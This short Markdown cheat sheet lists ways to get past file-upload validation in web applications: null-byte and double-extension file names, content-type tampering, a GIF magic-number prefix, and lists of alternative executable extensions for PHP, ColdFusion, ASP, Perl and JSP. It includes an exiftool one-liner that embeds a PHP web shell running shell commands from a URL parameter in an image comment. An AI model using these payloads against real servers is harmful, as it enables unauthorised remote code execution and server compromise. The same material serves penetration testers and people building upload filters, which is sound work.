## Bypass Validations 
- Null Byte: `%00` to bypass file name restrictions (`wpes.php%00.png`)
- Double Extensions: `wpes.png.php`
- Altering content type
- Magic number: (Example: gif: `GIF89a;`)
  - <https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/>
- Code in image comment:
  - `exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg`

## Alternative Extensions 

PHP
- pht
- phpt
- phtml
- php3
- php4
- php5
- php6
- php7

CFM
- cfml
- cfc
- dbm

ASP
- aspx

Perl
- pl
- pm
- cgi
- lib

JSP
- jspx
- jsw
- jsv
- jspf

